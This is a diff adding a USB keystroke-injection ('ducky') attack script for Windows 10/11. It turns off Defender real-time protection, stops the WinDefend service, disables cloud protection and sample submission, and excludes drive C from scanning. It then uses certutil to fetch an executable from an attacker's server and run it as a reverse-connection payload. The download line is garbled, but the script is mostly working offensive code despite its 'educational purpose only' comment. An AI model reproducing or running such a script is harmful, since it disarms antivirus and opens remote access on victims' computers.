@@ -1,0 +1,70 @@
+REM Title: windows ducky script
+REM Author: usman
+REM Description: disabling windows real time protection and Defender, reverse payload connection ,then adds an exception of drive C for persistence
+REM Target: Windows 10/11
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 1000
+ENTER
+DELAY 500
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 500
+ALT y
+DELAY 500
+
+REM Exit security settings
+ALT F4
+
+REM windows ducky script
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 100
+ALT y
+ENTER
+REM to turn off windows firewall
+STRING sc stop WinDefend
+ENTER
+
+REM To turn off Automatic Sample Submission
+DELAY 100
+STRING Set-MpPreference -SubmitSamplesConsent NeverSend
+ENTER
+
+REM Disable Cloud-Based Protection
+DELAY 100
+STRING Set-MpPreference -MAPSReporting Disable
+ENTER
+
+REM Exclude drive C from Defender
+DELAY 100
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+
+REM  reverse connection payload
+REM launch the file server and then upload the executable and then insert ip and the port to below command 
+REM This is used for educational purpose only 
+DELAY 1000
+STRING certutil.exe -urlcache -split -f http://[ip] 127.0.0.1:[port] 4444/windows service.exe C:\Windows\windows service.exe & C:\Windows\windows service.exe
+ENTER
+STRING exit
